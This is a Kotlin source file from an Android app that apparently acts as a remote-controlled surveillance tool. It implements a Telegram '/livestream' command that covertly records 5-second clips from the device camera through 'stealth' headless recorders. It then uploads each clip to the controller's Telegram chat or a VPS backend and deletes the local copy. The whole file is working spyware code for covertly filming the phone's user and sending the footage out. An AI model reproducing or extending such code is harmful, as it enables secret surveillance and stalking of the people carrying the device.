package com.izhaanintellect.pasa.commands

import android.content.Context
import android.util.Log
import com.izhaanintellect.pasa.bot.SendMessageRequest
import com.izhaanintellect.pasa.bot.TelegramApi
import com.izhaanintellect.pasa.camera.StealthCaptureBridge
import com.izhaanintellect.pasa.camera.StealthVideoManager
import com.izhaanintellect.pasa.data.PreferencesManager
import com.izhaanintellect.pasa.network.PasaBackendApi
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Enables near-live video streaming from the device camera via Telegram.
 *
 * Records short 5-second video segments and dispatches them sequentially as video messages
 * to the owner's Telegram chat via the VPS backend control plane or direct bot API.
 *
 * Commands: /livestream [front|back] [duration_minutes]
 */
@Singleton
class LiveStreamCommand @Inject constructor(
    @ApplicationContext private val context: Context,
    private val preferencesManager: PreferencesManager,
    private val telegramApi: TelegramApi,
    private val pasaBackendApi: PasaBackendApi,
    private val stealthVideoManager: StealthVideoManager
) : Command {

    override val name = "/livestream"
    override val description = "Start near-live video streaming to Telegram"
    override val usage = "/livestream [front|back] [duration_minutes]"

    companion object {
        private const val TAG = "PASA_LiveStream"
        private const val SEGMENT_DURATION_SECONDS = 5
        private const val DEFAULT_DURATION_MINUTES = 5
        private const val MAX_DURATION_MINUTES = 30
        private const val SEGMENT_TIMEOUT_MS = 20000L

        val isStreaming = AtomicBoolean(false)
        private var streamJob: Job? = null
        private val segmentCount = AtomicInteger(0)
    }

    override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
        if (isStreaming.get()) {
            return CommandResult(
                success = false,
                message = "⚠️ A live stream is already active. Send <code>/stopstream</code> to end it first."
            )
        }

        // Parse arguments
        var useFront = true
        var durationMinutes = DEFAULT_DURATION_MINUTES

        for (arg in args) {
            when (arg.lowercase()) {
                "front" -> useFront = true
                "back", "rear" -> useFront = false
                else -> {
                    val mins = arg.toIntOrNull()
                    if (mins != null && mins in 1..MAX_DURATION_MINUTES) {
                        durationMinutes = mins
                    }
                }
            }
        }

        val cameraStr = if (useFront) "Front" else "Back"
        isStreaming.set(true)
        segmentCount.set(0)

        // Launch streaming in background coroutine
        val startTime = System.currentTimeMillis()
        streamJob = CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            val endTime = startTime + (durationMinutes * 60 * 1000L)
            var consecutiveFailures = 0

            try {
                while (isActive && isStreaming.get() && System.currentTimeMillis() < endTime) {
                    val segNum = segmentCount.incrementAndGet()
                    val elapsed = (System.currentTimeMillis() - startTime) / 1000
                    val elapsedStr = String.format("%02d:%02d", elapsed / 60, elapsed % 60)

                    Log.i(TAG, "Recording segment $segNum (elapsed: $elapsedStr)")

                    // 1. Primary: headless StealthVideoManager (low-overhead, no Activity churn, fast SD)
                    var videoFile = try {
                        stealthVideoManager.recordVideo(
                            useFrontCamera = useFront,
                            durationSeconds = SEGMENT_DURATION_SECONDS,
                            lowRes = true
                        )
                    } catch (e: Exception) {
                        Log.w(TAG, "Headless recording error on segment $segNum: ${e.message}")
                        null
                    }

                    // 2. Secondary fallback: StealthCaptureBridge (Activity in TOP state)
                    if (videoFile == null || !videoFile.exists() || videoFile.length() == 0L) {
                        Log.i(TAG, "Headless recording returned null, falling back to StealthCaptureBridge")
                        val bridgeResult = try {
                            StealthCaptureBridge.recordVideo(
                                context = context,
                                useFront = useFront,
                                durationSeconds = SEGMENT_DURATION_SECONDS,
                                timeoutMs = SEGMENT_TIMEOUT_MS
                            )
                        } catch (e: Exception) {
                            Log.w(TAG, "Bridge recording error on segment $segNum: ${e.message}")
                            null
                        }
                        videoFile = bridgeResult?.file
                    }

                    if (videoFile != null && videoFile.exists() && videoFile.length() > 0) {
                        consecutiveFailures = 0
                        val caption = "🔴 LIVE [Seg $segNum] — $cameraStr Camera — $elapsedStr elapsed"

                        try {
                            if (preferencesManager.useBackendServer) {
                                // Relay through VPS backend control plane
                                val deviceIdBody = preferencesManager.deviceId.toRequestBody("text/plain".toMediaTypeOrNull())
                                val msgBody = caption.toRequestBody("text/plain".toMediaTypeOrNull())
                                val reqFile = videoFile.asRequestBody("video/mp4".toMediaTypeOrNull())
                                val videoPart = MultipartBody.Part.createFormData("video", videoFile.name, reqFile)

                                val resp = pasaBackendApi.sendDeviceResponse(
                                    deviceId = deviceIdBody,
                                    commandId = null,
                                    message = msgBody,
                                    photo = null,
                                    audio = null,
                                    video = videoPart,
                                    evidence = null,
                                    latitude = null,
                                    longitude = null
                                )
                                Log.i(TAG, "Segment $segNum relayed to backend: ${resp.ok}")
                            } else if (preferencesManager.botToken.isNotBlank() && preferencesManager.ownerChatIdLong != 0L) {
                                // Direct Telegram bot API
                                val mediaType = "video/mp4".toMediaTypeOrNull()
                                val requestBody = videoFile.asRequestBody(mediaType)
                                val videoPart = MultipartBody.Part.createFormData(
                                    "video", videoFile.name, requestBody
                                )
                                val chatIdPart = preferencesManager.ownerChatIdLong.toString()
                                    .toRequestBody("text/plain".toMediaTypeOrNull())
                                val captionPart = caption.toRequestBody("text/plain".toMediaTypeOrNull())

                                telegramApi.sendVideo(
                                    preferencesManager.botToken,
                                    chatIdPart,
                                    videoPart,
                                    captionPart
                                )
                                Log.i(TAG, "Segment $segNum sent directly to Telegram")
                            } else {
                                Log.w(TAG, "No valid transport available to dispatch segment $segNum")
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "Failed to dispatch segment $segNum: ${e.message}")
                        }

                        try { videoFile.delete() } catch (_: Exception) {}
                    } else {
                        consecutiveFailures++
                        Log.w(TAG, "Segment $segNum capture failed (consecutive: $consecutiveFailures)")

                        if (consecutiveFailures >= 5) {
                            Log.e(TAG, "Too many consecutive failures — stopping live stream")
                            break
                        }
                        delay(2000)
                    }
                }
            } catch (_: CancellationException) {
                Log.i(TAG, "Live stream cancelled")
            } catch (e: Exception) {
                Log.e(TAG, "Live stream error", e)
            } finally {
                isStreaming.set(false)
                val totalSegments = segmentCount.get()
                val totalDuration = (System.currentTimeMillis() - startTime) / 1000
                val durationStr = String.format("%02d:%02d", totalDuration / 60, totalDuration % 60)
                val summaryText = """
                    ⏹️ <b>LIVE STREAM ENDED</b>
                    ━━━━━━━━━━━━━━━━━━━━
                    📹 Total segments: <b>$totalSegments</b>
                    ⏱️ Total duration: <b>$durationStr</b>
                    📹 Camera: <b>$cameraStr</b>
                """.trimIndent()

                try {
                    if (preferencesManager.useBackendServer) {
                        val deviceIdBody = preferencesManager.deviceId.toRequestBody("text/plain".toMediaTypeOrNull())
                        val msgBody = summaryText.toRequestBody("text/plain".toMediaTypeOrNull())
                        pasaBackendApi.sendDeviceResponse(
                            deviceId = deviceIdBody,
                            commandId = null,
                            message = msgBody,
                            photo = null,
                            audio = null,
                            video = null,
                            evidence = null,
                            latitude = null,
                            longitude = null
                        )
                    } else if (preferencesManager.botToken.isNotBlank() && preferencesManager.ownerChatIdLong != 0L) {
                        telegramApi.sendMessage(
                            token = preferencesManager.botToken,
                            request = SendMessageRequest(
                                chatId = preferencesManager.ownerChatIdLong,
                                text = summaryText
                            )
                        )
                    }
                } catch (_: Exception) {}
            }
        }

        return CommandResult(
            success = true,
            message = """
                🔴 <b>LIVE STREAM ACTIVE</b>
                ━━━━━━━━━━━━━━━━━━━━
                📹 Camera: <b>$cameraStr</b>
                ⏱️ Duration: <b>$durationMinutes minutes</b>
                📡 Segment interval: <b>${SEGMENT_DURATION_SECONDS} seconds</b>
                
                Segments will arrive as sequential video messages.
                Send <code>/stopstream</code> to end.
            """.trimIndent()
        )
    }

    fun stopStream(): CommandResult {
        if (!isStreaming.get()) {
            return CommandResult(
                success = false,
                message = "ℹ️ No active live stream to stop."
            )
        }

        isStreaming.set(false)
        streamJob?.cancel()
        streamJob = null

        return CommandResult(
            success = true,
            message = "⏹️ Live stream stop signal sent. Final summary will follow."
        )
    }
}
